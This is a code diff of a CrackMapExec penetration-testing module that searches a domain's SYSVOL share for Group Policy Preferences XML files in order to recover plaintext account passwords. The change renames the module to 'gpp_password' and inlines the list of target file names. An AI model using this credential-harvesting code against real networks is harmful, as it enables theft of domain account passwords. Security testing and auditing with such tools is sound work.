@@ -10,7 +10,7 @@ class CMEModule:
       Module by @byt3bl33d3r
     '''
 
-    name = 'gpp_decrypt'
+    name = 'gpp_password'
     description = 'Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences.'
     supported_protocols = ['smb']
     opsec_safe = True
@@ -20,14 +20,12 @@ class CMEModule:
         '''
         '''
 
-        self.xml_files = ['Groups.xml','Services.xml','Scheduledtasks.xml','DataSources.xml','Printers.xml','Drives.xml']
-
     def on_login(self, context, connection):
         shares = connection.shares()
         for share in shares:
             if share['name'] == 'SYSVOL' and 'READ' in share['access']:
 
-                paths = connection.spider('SYSVOL', pattern=self.xml_files)
+                paths = connection.spider('SYSVOL', pattern=['Groups.xml','Services.xml','Scheduledtasks.xml','DataSources.xml','Printers.xml','Drives.xml'])
 
                 for path in paths:
                     buf = StringIO()
